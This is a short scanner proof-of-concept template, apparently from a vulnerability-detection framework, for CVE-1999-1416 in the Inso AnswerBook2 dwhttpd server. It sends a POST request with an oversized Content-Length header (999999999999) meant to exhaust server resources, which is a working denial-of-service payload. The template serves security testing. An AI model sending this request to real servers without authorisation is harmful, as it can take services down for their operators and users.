[info]
author = "ave"
description = "检测目标 AnswerBook2 dwhttpd 3.1a4 服务器是否存在 CVE-1999-1416 资源耗尽型拒绝服务漏洞。通过发送包含超长 Content-Length 字段的恶意 HTTP POST 请求，验证服务器是否因资源耗尽而响应异常。"
id = "POC-AVE-1999-1503"
name = "CVE-1999-1416 PoC - Inso dwhttpd DoS"
severity = "medium"
tags = ["ave-1999-1503"]
vuln_id = [
    "CVE-1999-1416",
    "AVE-1999-1503",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
Content-Length = "999999999999"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "AnswerBook2",
    "dwhttpd",
]
